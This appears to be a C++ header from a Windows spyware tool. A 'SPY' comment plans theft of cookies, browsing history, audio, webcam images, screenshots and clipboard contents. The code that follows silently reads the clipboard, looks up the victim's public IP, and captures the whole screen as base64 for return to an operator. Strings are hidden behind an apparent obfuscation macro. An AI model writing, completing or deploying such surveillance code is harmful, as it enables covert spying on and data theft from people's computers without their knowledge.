/*
SPY:
grab cookies: return whatever
grab publicip: return string [ok]
grab history: return whatever (check jabor)
record audio
screenshot: return base64 (unless we can return a file, then get an API which screenshots and return the file)
webcam image: return base64, unless above, or whatever CV returns
clipboard: return string [ok]
*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>

#include "strings.hh"
#include "string_functions.hh"

#include "request.hh"

#pragma once

std::string grab_clipboard() {
    if (!OpenClipboard(NULL)) {
        return cs(failed_to_open_clipboard);
    }
    HANDLE clipboard_data_handle = GetClipboardData(CF_TEXT);
    char* clipboard_data = static_cast<char*>(GlobalLock(clipboard_data_handle));
    GlobalUnlock(clipboard_data_handle);
    CloseClipboard();
    return clipboard_data;
}

std::string grab_ip() {
    return get_request(cs(ifconfig_address));
}

CLSID get_encoder_clsid(const WCHAR* format) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* codecs = nullptr;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return CLSID_NULL;
    codecs = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (codecs == nullptr) return CLSID_NULL;
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(codecs[i].MimeType, format) == 0) {
            CLSID clsid;
            clsid = codecs[i].Clsid;
            free(codecs);
            return clsid;
        }
    }
    free(codecs);
    return CLSID_NULL;
}

std::string grab_screenshot() {

    // initialize gdi+
    Gdiplus::GdiplusStartupInput gdiplus_startup_input;
    ULONG_PTR gdiplus_token;
    Gdiplus::GdiplusStartup(&gdiplus_token, &gdiplus_startup_input, nullptr);

    // create a screen capture
    SetProcessDPIAware();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc_screen = GetDC(GetDesktopWindow());
    int logical_screen_width = GetDeviceCaps(hdc_screen, HORZRES);
    int logical_screen_height = GetDeviceCaps(hdc_screen, VERTRES);
    int dpi_x = GetDeviceCaps(hdc_screen, LOGPIXELSX);
    int dpi_y = GetDeviceCaps(hdc_screen, LOGPIXELSY);
    int scale_x = dpi_x / 96;
    int scale_y = dpi_y / 96;
    int capture_width = width * scale_x;
    int capture_height = height * scale_y;
    HDC hdc_mem = CreateCompatibleDC(hdc_screen);
    HBITMAP h_bitmap = CreateCompatibleBitmap(hdc_screen, capture_width, capture_height);
    SelectObject(hdc_mem, h_bitmap);
    BitBlt(hdc_mem, 0, 0, capture_width, capture_height, hdc_screen, 0, 0, SRCCOPY);

    // save the screenshot to a memory stream
    Gdiplus::Bitmap bitmap(h_bitmap, nullptr);
    CLSID clsid_encoder = get_encoder_clsid(L"image/png");
    Gdiplus::EncoderParameters encoder_params;
    encoder_params.Count = 1;
    encoder_params.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoder_params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoder_params.Parameter[0].NumberOfValues = 1;
    ULONG quality = 100;
    encoder_params.Parameter[0].Value = &quality;

    IStream* p_stream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &p_stream);
    bitmap.Save(p_stream, &clsid_encoder, &encoder_params);

    // get the size of the encoded data
    LARGE_INTEGER zero_offset = { 0 };
    ULARGE_INTEGER stream_size;
    p_stream->Seek(zero_offset, STREAM_SEEK_END, &stream_size);
    p_stream->Seek(zero_offset, STREAM_SEEK_SET, nullptr);

    // read the encoded data from the stream
    std::vector<BYTE> buffer(stream_size.LowPart);
    ULONG bytes_read = 0;
    p_stream->Read(buffer.data(), buffer.size(), &bytes_read);

    // convert the binary data to base64 string
    std::string base64;
    const std::string base64_chars = cs(b64_chars_chars);

    size_t input_size = buffer.size();
    size_t output_size = 4 * ((input_size + 2) / 3);

    base64.resize(output_size);
    unsigned char* input = buffer.data();
    unsigned char* output = reinterpret_cast<unsigned char*>(&base64[0]);

    for (size_t i = 0, j = 0; i < input_size;)
    {
        uint32_t octet_a = i < input_size ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octet_b = i < input_size ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octet_c = i < input_size ? static_cast<uint32_t>(input[i++]) : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        output[j++] = base64_chars[(triple >> 18) & 0x3F];
        output[j++] = base64_chars[(triple >> 12) & 0x3F];
        output[j++] = base64_chars[(triple >> 6) & 0x3F];
        output[j++] = base64_chars[triple & 0x3F];
    }

    // add padding characters if needed
    size_t padding = 3 - (input_size % 3);
    if (padding != 3) base64.resize(output_size - padding);

    // clean up resources
    DeleteDC(hdc_mem);
    ReleaseDC(nullptr, hdc_screen);
    DeleteObject(h_bitmap);
    p_stream->Release();

    return base64;
}